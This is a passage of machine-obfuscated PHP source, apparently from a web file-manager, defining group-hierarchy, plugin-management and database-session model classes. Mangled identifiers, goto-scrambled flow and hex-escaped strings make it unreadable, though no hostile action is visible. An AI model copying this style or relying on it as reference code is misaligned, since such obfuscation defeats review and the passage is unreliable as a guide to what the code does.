array($AÅí‰ÒÌË[89] => $b¥íˆ¨¦¶ˆ, $AÅí‰ÒÌË[359] => array($AÅí‰ÒÌË[751], "\45{$B–„®ñ‡¼}\x25")); goto d«Ó½êÎº‡; CˆÒÈĞ‡Ã: return $AµĞ—˜¦¯; goto F‚é·Õ‰’; b•ŒøéÍË´: $A‹ïå¨‰¶¼ = array_to_keyvalue($A‹ïå¨‰¶¼, $AÅí‰ÒÌË[33], $AÅí‰ÒÌË[2099]); $AµĞ—˜¦¯ = $this->where(array($AÅí‰ÒÌË[2173] => array($AÅí‰ÒÌË[7], $A‹ïå¨‰¶¼)))->select(); if (!$AµĞ—˜¦¯) { return array(); } goto CˆÒÈĞ‡Ã; F‚é·Õ‰’: } protected function _listDataApplyItem($f¾ê¤¢••ì) { $C·ÆÁ²„Ã = array($f¾ê¤¢••ì); $this->_listDataApply($C·ÆÁ²„Ã); return $C·ÆÁ²„Ã[0]; } protected function _listDataApply(&$c¥š¸†™Çë) { goto E˜£¶ØîÂò; c‹°ø“ª‰ù: $this->_listAppendChildren($c¥š¸†™Çë); $this->_listAppendChildrenMember($c¥š¸†™Çë); $this->_listAppendMeta($c¥š¸†™Çë, $E”ÖŒİÈáÆ); goto cáğ¤ãç¼; E˜£¶ØîÂò: $Cğ¦ã¾ÓŞÁ =& $_SERVER[îÖ]; if (!$c¥š¸†™Çë) { return; } $E”ÖŒİÈáÆ = array_to_keyvalue($c¥š¸†™Çë, $Cğ¦ã¾ÓŞÁ[33], $Cğ¦ã¾ÓŞÁ[2099]); goto c‹°ø“ª‰ù; cáğ¤ãç¼: $this->_listAppendParent($c¥š¸†™Çë); $this->_listAppendSourceRoot($c¥š¸†™Çë, $E”ÖŒİÈáÆ); goto dÕó•”õ­; dÕó•”õ­: } private function _listAppendChildren(&$FŠ®ƒÌíÔ³) { goto e’Ö×§Ù„¬; AìïÆœİÍ: $eÊ£»Óİ± = count($FŠ®ƒÌíÔ³); $aÈ†é‘šõ‰ = $this->tablePrefix . $this->tableName; for ($b®¢¢ó¹Ù = 0, $bâÆÂˆÄø“ = 0; $b®¢¢ó¹Ù < $eÊ£»Óİ±; $b®¢¢ó¹Ù++) { $bâÆÂˆÄø“++; $Bƒ¹ Éò¸Ÿ = $FŠ®ƒÌíÔ³[$b®¢¢ó¹Ù][$B³¬Ûã¨“†[2099]]; $CªëøÙó¼ù .= "\x53\105\114\x45\103\124\x20\52\x20\106\x52\x4f\115\x20\50\123\105\x4c\105\103\x54\x20\47{$Bƒ¹ Éò¸Ÿ}\x5f\143\150\x69\154\144\47\40\x61\x73\x20\x68\141\x73\x20\106\x52\117\x4d\x20\x60{$aÈ†é‘šõ‰}\140\40\167\x68\145\x72\x65\40\x70\x61\x72\145\x6e\x74\x49\104\75{$Bƒ¹ Éò¸Ÿ}\40\154\x69\x6d\151\164\x20\x31\51\40\141\x73\x20\164\x62\137{$Bƒ¹ Éò¸Ÿ}\x20\x75\x6e\151\157\x6e\40\x61\154\x6c\40"; if (($bâÆÂˆÄø“ >= 20 || $b®¢¢ó¹Ù == $eÊ£»Óİ± - 1) && $CªëøÙó¼ù) { $CªëøÙó¼ù = substr($CªëøÙó¼ù, 0, -strlen($B³¬Ûã¨“†[449])); $c¼ˆÏğ¤Êò = $this->query($CªëøÙó¼ù); $C¬ò¾‡Ì¶½ = array_merge($C¬ò¾‡Ì¶½, $c¼ˆÏğ¤Êò); $bâÆÂˆÄø“ = 0; $CªëøÙó¼ù = $B³¬Ûã¨“†[33]; } } goto e¨‰•«õ…Å; e¨‰•«õ…Å: $C¬ò¾‡Ì¶½ = array_to_keyvalue($C¬ò¾‡Ì¶½, $B³¬Ûã¨“†[450]); foreach ($FŠ®ƒÌíÔ³ as &$A›¦èÇ¼®…) { $A›¦èÇ¼®…[$B³¬Ûã¨“†[2183]] = isset($C¬ò¾‡Ì¶½[$A›¦èÇ¼®…[$B³¬Ûã¨“†[2099]] . $B³¬Ûã¨“†[2184]]); } goto b„õğ£°é´; e’Ö×§Ù„¬: $B³¬Ûã¨“† =& $_SERVER[îÖ]; $CªëøÙó¼ù = $B³¬Ûã¨“†[361]; $C¬ò¾‡Ì¶½ = array(); goto AìïÆœİÍ; b„õğ£°é´: } private function _listAppendChildrenMember(&$C‘´¼·Éš) { goto B¸î…§Ç©¬; cì°®¯º’›: $FÊ»²÷äİ§ = array_to_keyvalue($FÊ»²÷äİ§, $B¤º§ÅÁÈÎ[450]); foreach ($C‘´¼·Éš as &$EÉÊŒËĞÂ) { $EÉÊŒËĞÂ[$B¤º§ÅÁÈÎ[2185]] = isset($FÊ»²÷äİ§[$EÉÊŒËĞÂ[$B¤º§ÅÁÈÎ[2099]] . $B¤º§ÅÁÈÎ[2184]]); } goto Bèî·œÉÉ; B¸î…§Ç©¬: $B¤º§ÅÁÈÎ =& $_SERVER[îÖ]; $a™¡äÄÓ±Ï = $B¤º§ÅÁÈÎ[361]; $FÊ»²÷äİ§ = array(); goto bÚŒˆòÂŞé; bÚŒˆòÂŞé: $FĞÂ‰¨é¨ƒ = count($C‘´¼·Éš); $c™¹ô’÷Œ‰ = $this->tablePrefix . $B¤º§ÅÁÈÎ[2175]; for ($FŸÑ„¦µÙ‘ = 0, $fãÔ›×¢Â¬ = 0; $FŸÑ„¦µÙ‘ < $FĞÂ‰¨é¨ƒ; $FŸÑ„¦µÙ‘++) { $fãÔ›×¢Â¬++; $bÌÄ›´Øô¯ = $C‘´¼·Éš[$FŸÑ„¦µÙ‘][$B¤º§ÅÁÈÎ[2099]]; $a™¡äÄÓ±Ï .= "\123\105\x4c\105\x43\124\x20\52\x20\x46\x52\117\115\40\50\x53\105\x4c\x45\103\x54\x20\x27{$bÌÄ›´Øô¯}\x5f\143\150\x69\x6c\x64\x27\x20\141\163\x20\150\x61\x73\x20\x46\x52\117\115\x20\x60{$c™¹ô’÷Œ‰}\x60\40\167\150\x65\162\x65\x20\x67\x72\157\165\x70\111\104\75{$bÌÄ›´Øô¯}\40\x6c\151\155\151\164\x20\61\x29\40\141\163\x20\x74\x62\x5f{$bÌÄ›´Øô¯}\x20\165\156\x69\157\x6e\x20\x61\154\154\40"; if (($fãÔ›×¢Â¬ >= 20 || $FŸÑ„¦µÙ‘ == $FĞÂ‰¨é¨ƒ - 1) && $a™¡äÄÓ±Ï) { $a™¡äÄÓ±Ï = substr($a™¡äÄÓ±Ï, 0, -strlen($B¤º§ÅÁÈÎ[449])); $Fœ—£ø‘ = $this->query($a™¡äÄÓ±Ï); $FÊ»²÷äİ§ = array_merge($FÊ»²÷äİ§, $Fœ—£ø‘); $fãÔ›×¢Â¬ = 0; $a™¡äÄÓ±Ï = $B¤º§ÅÁÈÎ[33]; } } goto cì°®¯º’›; Bèî·œÉÉ: } private function _listAppendMeta(&$E§‰´°õâí, $B²ªô¶ƒ§¿) { $eğŠœ—¸ÔŞ =& $_SERVER[îÖ]; $D­ÖğôÒ© = array($eğŠœ—¸ÔŞ[2099] => array($eğŠœ—¸ÔŞ[7], $B²ªô¶ƒ§¿)); $FøÃèì¹¥ = Model($eğŠœ—¸ÔŞ[2174])->where($D­ÖğôÒ©)->select(); $FøÃèì¹¥ = array_to_keyvalue_group($FøÃèì¹¥, $eğŠœ—¸ÔŞ[2099]); foreach ($FøÃèì¹¥ as &$dÍßêåî¤Ş) { $dÍßêåî¤Ş = array_to_keyvalue($dÍßêåî¤Ş, $eğŠœ—¸ÔŞ[89], $eğŠœ—¸ÔŞ[359]); } foreach ($E§‰´°õâí as &$eêìÆÆ»Ë) { $eêìÆÆ»Ë[$eğŠœ—¸ÔŞ[417]] = array(); if (isset($FøÃèì¹¥[$eêìÆÆ»Ë[$eğŠœ—¸ÔŞ[2099]]])) { $eêìÆÆ»Ë[$eğŠœ—¸ÔŞ[417]] = $FøÃèì¹¥[$eêìÆÆ»Ë[$eğŠœ—¸ÔŞ[2099]]]; } } } protected function parentLevelArray($BŒ‰Îàåä) { $déƒ‰ãÍ­Ş =& $_SERVER[îÖ]; $BŒ‰Îàåä = explode($déƒ‰ãÍ­Ş[47], trim($BŒ‰Îàåä, $déƒ‰ãÍ­Ş[47])); $BŒ‰Îàåä = array_remove_value($BŒ‰Îàåä, $déƒ‰ãÍ­Ş[468]); return $BŒ‰Îàåä; } private function _listAppendParent(&$B¼–ŸƒŒ‰) { goto a‰øê¨Àæ; a‰øê¨Àæ: $E†ÔÌØ…š‰ =& $_SERVER[îÖ]; $bé­Õ£¿™Ù = array(); foreach ($B¼–ŸƒŒ‰ as &$EŒ±„î¿ÌÉ) { $bé­Õ£¿™Ù[$EŒ±„î¿ÌÉ[$E†ÔÌØ…š‰[2099]]] = $EŒ±„î¿ÌÉ[$E†ÔÌØ…š‰[28]]; $C­®à÷õ¸á = $this->parentLevelArray($EŒ±„î¿ÌÉ[$E†ÔÌØ…š‰[459]]); foreach ($C­®à÷õ¸á as $a¾»¿½¨³Ù) { if (!isset($bé­Õ£¿™Ù[$a¾»¿½¨³Ù])) { $bé­Õ£¿™Ù[$a¾»¿½¨³Ù] = 0; } } } goto d‹š–ÔæŒ; d‹š–ÔæŒ: $FÕÑ¥ = array(); foreach ($bé­Õ£¿™Ù as $e²Õªòì… => $C…óŞ®ëñù) { if (!$C…óŞ®ëñù) { $FÕÑ¥[] = $e²Õªòì…; } } if ($FÕÑ¥) { $F¡Ôöà‡‘ñ = array($E†ÔÌØ…š‰[2173] => array($E†ÔÌØ…š‰[384], $FÕÑ¥)); $e°ÍØÍ³ = $this->field($E†ÔÌØ…š‰[2186])->where($F¡Ôöà‡‘ñ)->select(); $Có¬ºÍëø¬ = array_to_keyvalue($e°ÍØÍ³, $E†ÔÌØ…š‰[2099], $E†ÔÌØ…š‰[28]); $bé­Õ£¿™Ù = array_merge_index($bé­Õ£¿™Ù, $Có¬ºÍëø¬); } goto f¹’çñ¾; f¹’çñ¾: $eø¥´ÀÁ¼¦ = $GLOBALS[$E†ÔÌØ…š‰[6]][$E†ÔÌØ…š‰[84]][$E†ÔÌØ…š‰[2187]]; foreach ($B¼–ŸƒŒ‰ as &$EŒ±„î¿ÌÉ) { $C­®à÷õ¸á = $this->parentLevelArray($EŒ±„î¿ÌÉ[$E†ÔÌØ…š‰[459]]); $d¿â¹ç·˜ = $E†ÔÌØ…š‰[33]; foreach ($C­®à÷õ¸á as $e²Õªòì… => $a¾»¿½¨³Ù) { if ($eø¥´ÀÁ¼¦ && $e²Õªòì… == 0) { continue; } $d¿â¹ç·˜ .= $bé­Õ£¿™Ù[$a¾»¿½¨³Ù] . $E†ÔÌØ…š‰[8]; } if ($C­®à÷õ¸á) { $d¿â¹ç·˜ .= $EŒ±„î¿ÌÉ[$E†ÔÌØ…š‰[28]]; } $EŒ±„î¿ÌÉ[$E†ÔÌØ…š‰[463]] = str_replace($E†ÔÌØ…š‰[467], $E†ÔÌØ…š‰[8], $d¿â¹ç·˜); } goto D­Àñæ¶¿Ñ; D­Àñæ¶¿Ñ: } private function _listAppendSourceRoot(&$B¯Ë¡íÚ‰è, $BÍÒøÉåéŒ) { goto EÉ¢Œâã¸—; b•ßÌÓØ§Ã: foreach ($B¯Ë¡íÚ‰è as &$B±œ§‘–‰«) { $B±œ§‘–‰«[$E‡ºÉ¼Ì¡[391]] = $fâŠØË“[$B±œ§‘–‰«[$E‡ºÉ¼Ì¡[2099]]] ? $fâŠØË“[$B±œ§‘–‰«[$E‡ºÉ¼Ì¡[2099]]] : array(); } goto fñ¸”Òç½Ù; EÉ¢Œâã¸—: $E‡ºÉ¼Ì¡ =& $_SERVER[îÖ]; $bçãÆ¦‹¢ = array($E‡ºÉ¼Ì¡[371] => SourceModel::TYPE_GROUP, $E‡ºÉ¼Ì¡[461] => 0, $E‡ºÉ¼Ì¡[456] => array($E‡ºÉ¼Ì¡[7], $BÍÒøÉåéŒ)); $f¹ÙñÂ°·‹ = $E‡ºÉ¼Ì¡[2188]; goto b‰¾ŒŞ‰‰; b‰¾ŒŞ‰‰: $fâŠØË“ = Model($E‡ºÉ¼Ì¡[752])->order($E‡ºÉ¼Ì¡[2189])->field($f¹ÙñÂ°·‹)->where($bçãÆ¦‹¢)->select(); $fâŠØË“ = array_to_keyvalue($fâŠØË“, $E‡ºÉ¼Ì¡[456]); $fâŠØË“ = array_remove_key($fâŠØË“, $E‡ºÉ¼Ì¡[456]); goto b•ßÌÓØ§Ã; fñ¸”Òç½Ù: } protected function groupMerge($A¯ÍòÀ¾àÆ) { $A¯ÍòÀ¾àÆ = array_unique($A¯ÍòÀ¾àÆ); $D È‰Š”í = array(); for ($F–‚’°… = 0; $F–‚’°… < count($A¯ÍòÀ¾àÆ); $F–‚’°…++) { $EÔ±Âº¨» = !1; for ($DŞÏÎ¤ö°Š = 0; $DŞÏÎ¤ö°Š < count($A¯ÍòÀ¾àÆ); $DŞÏÎ¤ö°Š++) { if ($F–‚’°… == $DŞÏÎ¤ö°Š) { continue; } if ($this->isParentOf($A¯ÍòÀ¾àÆ[$DŞÏÎ¤ö°Š], $A¯ÍòÀ¾àÆ[$F–‚’°…])) { $EÔ±Âº¨» = !0; break; } } if (!$EÔ±Âº¨») { $D È‰Š”í[] = $A¯ÍòÀ¾àÆ[$F–‚’°…]; } } return $D È‰Š”í; } protected function isParentOf($C‹åŠÑ¹Å§, $dÀ·Ş‰‚ŒÙ) { goto dÓÇË×Ü™š; F„çÀ°Äôª: return !1; goto dá‡‚¥¯¶; dÓÇË×Ü™š: $Aß–ß™öÎù =& $_SERVER[îÖ]; if (!$C‹åŠÑ¹Å§ || !$dÀ·Ş‰‚ŒÙ || $C‹åŠÑ¹Å§ == $dÀ·Ş‰‚ŒÙ) { return !1; } $b³²œ†±¯Ø = $this->getInfoSimple($C‹åŠÑ¹Å§); goto E¯È´š°»Š; E¯È´š°»Š: $Dµ¼øˆ ®¦ = $this->getInfoSimple($dÀ·Ş‰‚ŒÙ); $C†‡‹¢ˆöß = $b³²œ†±¯Ø[$Aß–ß™öÎù[459]] . $C‹åŠÑ¹Å§ . $Aß–ß™öÎù[47]; if (substr($Dµ¼øˆ ®¦[$Aß–ß™öÎù[459]], 0, strlen($C†‡‹¢ˆöß)) == $C†‡‹¢ˆöß) { return !0; } goto F„çÀ°Äôª; dá‡‚¥¯¶: } public function groupShowRoot($dğÓÇæ½Ï„, $d ¹„èÓÎò = false) { goto Eíä ›Ì«Ò; C£ÊêğÍ“Ø: $FÉ•‹¾‡£ = array($dğÓÇæ½Ï„); if (count($e˜œ«ê·˜) == 0) { return $FÉ•‹¾‡£; } if ($d ¹„èÓÎò && count($e˜œ«ê·˜) == 1) { return $FÉ•‹¾‡£; } goto DÎï„ªÙº²; DÎï„ªÙº²: if (!$BŞ”…ŸÅÙå[$eØø˜Ò·Ò™[417]] || !isset($BŞ”…ŸÅÙå[$eØø˜Ò·Ò™[417]][$eØø˜Ò·Ò™[2171]]) || $BŞ”…ŸÅÙå[$eØø˜Ò·Ò™[417]][$eØø˜Ò·Ò™[2171]] == $eØø˜Ò·Ò™[2148]) { return $this->groupShowRoot($e˜œ«ê·˜[count($e˜œ«ê·˜) - 1], $d ¹„èÓÎò); } if ($BŞ”…ŸÅÙå[$eØø˜Ò·Ò™[417]][$eØø˜Ò·Ò™[2171]] == $eØø˜Ò·Ò™[346]) { $aáŞ ²Ö†Ü = explode($eØø˜Ò·Ò™[47], $BŞ”…ŸÅÙå[$eØø˜Ò·Ò™[417]][$eØø˜Ò·Ò™[2172]]); if ($aáŞ ²Ö†Ü) { $FÉ•‹¾‡£ = array_merge($FÉ•‹¾‡£, $aáŞ ²Ö†Ü); } } return $FÉ•‹¾‡£; goto fÊéî‘øí‚; Eíä ›Ì«Ò: $eØø˜Ò·Ò™ =& $_SERVER[îÖ]; $BŞ”…ŸÅÙå = $this->getInfo($dğÓÇæ½Ï„); $e˜œ«ê·˜ = $this->parentLevelArray($BŞ”…ŸÅÙå[$eØø˜Ò·Ò™[459]]); goto C£ÊêğÍ“Ø; fÊéî‘øí‚: } protected function resetParentLevel() { $c¨ÆÁ¤½‚† =& $_SERVER[îÖ]; $Aë‹¤ø¸¡ã = $c¨ÆÁ¤½‚†[2099]; $c„†‘¿ôÎ = $this->select(); $c„†‘¿ôÎ = array_to_keyvalue($c„†‘¿ôÎ, $Aë‹¤ø¸¡ã); foreach ($c„†‘¿ôÎ as $f ¼ŞÉêŒ©) { goto cÖàí‚¾„; cÖàí‚¾„: $d“¬‡Óøâ´ = $f ¼ŞÉêŒ©; $dñŞßö“ = array(); while ($d“¬‡Óøâ´[$c¨ÆÁ¤½‚†[461]] != 0) { $dñŞßö“[] = $d“¬‡Óøâ´[$c¨ÆÁ¤½‚†[461]]; $d“¬‡Óøâ´ = $c„†‘¿ôÎ[$d“¬‡Óøâ´[$c¨ÆÁ¤½‚†[461]]]; } goto b°Úª­æåŠ; b°Úª­æåŠ: $dñŞßö“[] = 0; $dñŞßö“ = $c¨ÆÁ¤½‚†[47] . implode($c¨ÆÁ¤½‚†[47], array_reverse($dñŞßö“)) . $c¨ÆÁ¤½‚†[47]; $this->setNamePinyin($f ¼ŞÉêŒ©[$Aë‹¤ø¸¡ã], $f ¼ŞÉêŒ©[$c¨ÆÁ¤½‚†[28]]); goto A‹ô¦Š‹æ¯; A‹ô¦Š‹æ¯: $this->where(array($Aë‹¤ø¸¡ã => $f ¼ŞÉêŒ©[$Aë‹¤ø¸¡ã]))->save(array($c¨ÆÁ¤½‚†[525] => $dñŞßö“)); goto bÔ«Îõõçò; bÔ«Îõõçò: } return $c„†‘¿ôÎ; } public function groupNameAuto($CÇ¥ëÍóõÖ, $eµÁªåŠÚ…) { $b“ÏàŸÛİ¹ =& $_SERVER[îÖ]; $E–ª±ÖÀÏ­ = $this->where(array($b“ÏàŸÛİ¹[368] => $CÇ¥ëÍóõÖ))->getField($b“ÏàŸÛİ¹[28], !0); if (!$E–ª±ÖÀÏ­ || !in_array($eµÁªåŠÚ…, $E–ª±ÖÀÏ­)) { return $eµÁªåŠÚ…; } for ($Døìä»­‰Ö = 1; $Døìä»­‰Ö <= count($E–ª±ÖÀÏ­) + 1; $Døìä»­‰Ö++) { $cšØ×ÄŸ¹ = $eµÁªåŠÚ… . "\50{$Døìä»­‰Ö}\51"; if (!in_array($cšØ×ÄŸ¹, $E–ª±ÖÀÏ­)) { return $cšØ×ÄŸ¹; } } } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\155\x2e\160\154\x75\147\151\x6e\114\151\163\164"; public $field = array("\156\141\155\x65", "\x73\x74\x61\x74\165\163", "\162\145\x67\151\145\x73\x74", "\x63\x6f\x6e\x66\151\147"); public function loadList($eğ®ğšÕ£ï = false) { $C¹¼ŒßñÊ× = array_to_keyvalue($this->listData(), $_SERVER[îÖ][28]); if ($eğ®ğšÕ£ï) { return $C¹¼ŒßñÊ×[$eğ®ğšÕ£ï]; } return $C¹¼ŒßñÊ×; } public function init() { $DŸĞƒçÚ Å =& $_SERVER[îÖ]; Hook::trigger($DŸĞƒçÚ Å[2190]); $AŒ”Õñœ· = $this->loadPluginList(); foreach ($AŒ”Õñœ· as $Eá«ù†°É => $a¹–Ú”à®Ö) { $c¦õµÔÈˆà = $this->appAllow($Eá«ù†°É, $a¹–Ú”à®Ö); if (!$c¦õµÔÈˆà) { continue; } foreach ($a¹–Ú”à®Ö[$DŸĞƒçÚ Å[2191]] as $F‘¬ß¢ÔÃ› => $d²¸¸Ÿ–¯) { Hook::bind($F‘¬ß¢ÔÃ›, $d²¸¸Ÿ–¯); } } Hook::trigger($DŸĞƒçÚ Å[2192]); Hook::trigger(ACTION); } public function appAllow($f“âÓ´öğ, $BÉæ¦’ùîä, $c—Û¢î¬öÌ = true) { $dùÄ×…Òò­ =& $_SERVER[îÖ]; $FÏ‹©òààŒ = PLUGIN_DIR . $f“âÓ´öğ . $dùÄ×…Òò­[2193]; if (!is_array($BÉæ¦’ùîä) || !is_array($BÉæ¦’ùîä[$dùÄ×…Òò­[2191]]) || !is_file($FÏ‹©òààŒ) || $BÉæ¦’ùîä[$dùÄ×…Òò­[688]] != 1) { return !1; } if ($c—Û¢î¬öÌ && !Action($dùÄ×…Òò­[2194])->checkAuth($f“âÓ´öğ)) { return !1; } return !0; } public function unInstall($eŠ¹•·ç¥¶) { $cÀØñ¯¥›ğ =& $_SERVER[îÖ]; $Eô‘ø§‚©è = $this->loadList($eŠ¹•·ç¥¶); if (file_exists(PLUGIN_DIR . $eŠ¹•·ç¥¶)) { Hook::apply($eŠ¹•·ç¥¶ . $cÀØñ¯¥›ğ[2195]); } $this->remove($Eô‘ø§‚©è[$cÀØñ¯¥›ğ[367]]); } public function changeStatus($A±Äæ­·¯, $E­õâ°í¾…) { $E‡£”çëÆ² =& $_SERVER[îÖ]; $f¦‹˜ôÂÅ° = $this->loadList($A±Äæ­·¯); if ($E­õâ°í¾…) { Hook::apply($A±Äæ­·¯ . $E‡£”çëÆ²[2196]); } $this->update($f¦‹˜ôÂÅ°[$E‡£”çëÆ²[367]], array($E‡£”çëÆ²[2197] => $E­õâ°í¾…)); } public function appRegist($aÌ°ÃïîÖª, $eö‹ìŠİ‡õ) { $a†¾½ÄØ¼¦ =& $_SERVER[îÖ]; $d»™æÙíŒÚ = $this->loadList($aÌ°ÃïîÖª); if ($d»™æÙíŒÚ) { $this->update($d»™æÙíŒÚ[$a†¾½ÄØ¼¦[367]], array($a†¾½ÄØ¼¦[2191] => $eö‹ìŠİ‡õ)); } else { $e®—ö®¯¶ = array($a†¾½ÄØ¼¦[28] => $aÌ°ÃïîÖª, $a†¾½ÄØ¼¦[2191] => $eö‹ìŠİ‡õ, $a†¾½ÄØ¼¦[688] => 0, $a†¾½ÄØ¼¦[6] => $this->getConfigDefault($aÌ°ÃïîÖª)); $this->insert($e®—ö®¯¶); } } public function getConfigDefault($dª¿ÁØœô§) { $BÙË…‡ç…á =& $_SERVER[îÖ]; $b‘ÂÏ…õ† = array(); $aãŒ¢Œã¿Ç = $this->getPackageJson($dª¿ÁØœô§); if (!$aãŒ¢Œã¿Ç && is_array($aãŒ¢Œã¿Ç[$BÙË…‡ç…á[2198]])) { return $b‘ÂÏ…õ†; } foreach ($aãŒ¢Œã¿Ç[$BÙË…‡ç…á[2198]] as $BöìÙêˆë‘ => $E†Ç£Œà¥ç) { if (!isset($E†Ç£Œà¥ç[$BÙË…‡ç…á[359]]) || isset($b‘ÂÏ…õ†[$BöìÙêˆë‘])) { continue; } $b‘ÂÏ…õ†[$BöìÙêˆë‘] = $E†Ç£Œà¥ç[$BÙË…‡ç…á[359]]; } return $b‘ÂÏ…õ†; } public function getPackageJson($C‘ÅëÉ¦‘ò) { return Hook::apply($C‘ÅëÉ¦‘ò . $_SERVER[îÖ][2199]); } public function getConfig($Bª¹–£½¼æ, $eƒÖ½ò®àˆ = false) { $e´ÊÓÖŠÑ =& $_SERVER[îÖ]; $EĞƒ››…á = array(); $dÑÍœèîµ = $this->loadList($Bª¹–£½¼æ); if ($dÑÍœèîµ && is_array($dÑÍœèîµ[$e´ÊÓÖŠÑ[6]])) { $EĞƒ››…á = $dÑÍœèîµ[$e´ÊÓÖŠÑ[6]]; } if (!$EĞƒ››…á || $eƒÖ½ò®àˆ) { $EĞƒ››…á = $this->getConfigDefault($Bª¹–£½¼æ); } return $EĞƒ››…á; } public function setConfig($BéØ™‚ˆôè, $dŞìÊËç¹ = false) { goto BŠ ²®×«õ; E¿­‰…ïÕ: $D›‡ÏÃÇŞ = $a”“Âöó†„[$E•¼ïÅËÁ[6]]; if ($dŞìÊËç¹ == !1) { $D›‡ÏÃÇŞ = array(); $dŞìÊËç¹ = $this->getConfigDefault($BéØ™‚ˆôè); } foreach ($dŞìÊËç¹ as $B£œğˆØ˜Å => $b–ƒ¢Óñš) { $D›‡ÏÃÇŞ[$B£œğˆØ˜Å] = is_string($b–ƒ¢Óñš) ? trim($b–ƒ¢Óñš) : $b–ƒ¢Óñš; } goto D±îçÄÌ; D±îçÄÌ: $this->update($a”“Âöó†„[$E•¼ïÅËÁ[367]], array($E•¼ïÅËÁ[6] => $D›‡ÏÃÇŞ)); goto f—öÄï“»; BŠ ²®×«õ: $E•¼ïÅËÁ =& $_SERVER[îÖ]; $a”“Âöó†„ = $this->loadList($BéØ™‚ˆôè); if (!$a”“Âöó†„) { return !1; } goto E¿­‰…ïÕ; f—öÄï“»: } public function viewList() { goto E‹Ô—öçãæ; E‹Ô—öçãæ: $Aƒ‘šéÓÏ… =& $_SERVER[îÖ]; $aÍ ¸Š·Ö¯ = $this->loadList(); $this->pluginScan($aÍ ¸Š·Ö¯); goto BÛ–“ÎÏÀ; BÛ–“ÎÏÀ: $aÍ ¸Š·Ö¯ = $this->loadPluginList(); $Aº’ÕŒ‚¯Õ = array(); foreach ($aÍ ¸Š·Ö¯ as $EÆ¼‡ŒÈ‰© => $d··ŞŒ¨çİ) { unset($d··ŞŒ¨çİ[$Aƒ‘šéÓÏ…[2191]], $d··ŞŒ¨çİ[$Aƒ‘šéÓÏ…[6]]); $b”İ³¨“äù = PLUGIN_DIR . $d··ŞŒ¨çİ[$Aƒ‘šéÓÏ…[28]] . $Aƒ‘šéÓÏ…[2193]; if (!is_file($b”İ³¨“äù)) { continue; } $f«ïñŠ  = Hook::apply($d··ŞŒ¨çİ[$Aƒ‘šéÓÏ…[28]] . $Aƒ‘šéÓÏ…[2199]); if (is_array($f«ïñŠ )) { $Aº’ÕŒ‚¯Õ[$EÆ¼‡ŒÈ‰©] = array_merge($d··ŞŒ¨çİ, $f«ïñŠ ); } } goto fóŒ®‡—î´; fóŒ®‡—î´: return $Aº’ÕŒ‚¯Õ; goto añÚÛ’ğÌ; añÚÛ’ğÌ: } private function loadPluginList() { $bñ¨ÆÍ·•„ =& $_SERVER[îÖ]; $DôÖ‚Çõéğ = $this->loadList(); if (strtolower(MOD) == $bñ¨ÆÍ·•„[2200]) { return $DôÖ‚Çõéğ; } $fó®«ƒìîŸ = Hook::trigger($bñ¨ÆÍ·•„[2201], $DôÖ‚Çõéğ); if ($DôÖ‚Çõéğ && !$fó®«ƒìîŸ) { die; } return $fó®«ƒìîŸ ? $fó®«ƒìîŸ : $DôÖ‚Çõéğ; } private function pluginScan($D—»è§ë÷Ö) { $aÙÖ„©Ë‹ö =& $_SERVER[îÖ]; recursion_dir(PLUGIN_DIR, $d‚ÚÒë¦¬ø, $b¬¡˜Î¢®±, 0); foreach ($d‚ÚÒë¦¬ø as $aã»‘ç³‚­) { $a¼ˆ»Å = get_path_this($aã»‘ç³‚­); if (isset($D—»è§ë÷Ö[$a¼ˆ»Å]) || !file_exists($aã»‘ç³‚­ . $aÙÖ„©Ë‹ö[2202]) || !file_exists($aã»‘ç³‚­ . $aÙÖ„©Ë‹ö[2193])) { continue; } Hook::apply($a¼ˆ»Å . $aÙÖ„©Ë‹ö[2196]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\171\x73\x74\x65\x6d\x5f\x73\145\x73\x73\151\x6f\x6e"; public function get($C–¸ªíµä) { $fĞ†É¹£õ =& $_SERVER[îÖ]; $dôåÇ…‘ÍÛ = $this->where(array($fĞ†É¹£õ[2203] => $C–¸ªíµä))->find(); if (!is_array($dôåÇ…‘ÍÛ)) { return !1; } return $dôåÇ…‘ÍÛ[$fĞ†É¹£õ[691]]; } public function set($EøÑ¨¬Î‹É, $dö²¾­±ÚŸ, $CíÇŠ‘Ûîè = 3600) { $bì‡Œò…•… =& $_SERVER[îÖ]; $cÃ§‹¾ÑäÚ = array($bì‡Œò…•…[2203] => $EøÑ¨¬Î‹É, $bì‡Œò…•…[2129] => $dö²¾­±ÚŸ, $bì‡Œò…•…[2204] => $CíÇŠ‘Ûîè + time()); if (Session::get($bì‡Œò…•…[2205])) { $cÃ§‹¾ÑäÚ[$bì‡Œò…•…[1431]] = Session::get($bì‡Œò…•…[2205]); } else { $cÃ§‹¾ÑäÚ[$bì‡Œò…•…[1431]] = 0; } if ($this->get($EøÑ¨¬Î‹É)) { return $this->where(array($bì‡Œò…•…[2203] => $EøÑ¨¬Î‹É))->save($cÃ§‹¾ÑäÚ); } else { return $this->add($cÃ§‹¾ÑäÚ, array(), !0); } } public function remove($c˜ì‡Ë…Íö) { return $this->where(array($_SERVER[îÖ][2203] => $c˜ì‡Ë…Íö))->delete(); } public function clearTimeout() { return $this->where($_SERVER[îÖ][2206] . time())->delete(); } } goto AÅ¦âÚæÍÜ; e´ˆñôø‡Û: function ActionCall($AĞÄâ³Ö) { $F†Ê³ß¨Æî = array_slice(func_get_args(), 1); return ActionApply($AĞÄâ³Ö, $F†Ê³ß¨Æî); } function ActionCallApi($f¯Ï¹‘èƒ·, $c´•ç†é = '') { goto F²‰®Ä…Û»; F²‰®Ä…Û»: $bÉù‘„Á™Ø =& $_SERVER[©•ÖÏ¥Ø]; $c¼Ó•—¦Ú = $c´•ç†é; if (is_array($c´•ç†é)) { $c¼Ó•—¦Ú = $bÉù‘„Á™Ø[20]; foreach ($c´•ç†é as $a‘Ê¾¤µ“° => $eÎ‰Ø´”„…) { $eÎ‰Ø´”„… = is_array($eÎ‰Ø´”„…) ? json_encode($eÎ‰Ø´”„…) : $eÎ‰Ø´”„…; $eÎ‰Ø´”„… = is_bool($eÎ‰Ø´”„…) ? intval($eÎ‰Ø´”„…) : $eÎ‰Ø´”„…; $c¼Ó•—¦Ú .= $bÉù‘„Á™Ø[21] . $a‘Ê¾¤µ“° . $bÉù‘„Á™Ø[22] . rawurlencode($eÎ‰Ø´”„…); } } goto AŠ¸ãñ´ˆŞ; AŠ¸ãñ´ˆŞ: $cÃ«š»º† = Action($bÉù‘„Á™Ø[23])->accessToken(); $f¯Ï¹‘èƒ· = str_replace($bÉù‘„Á™Ø[5], 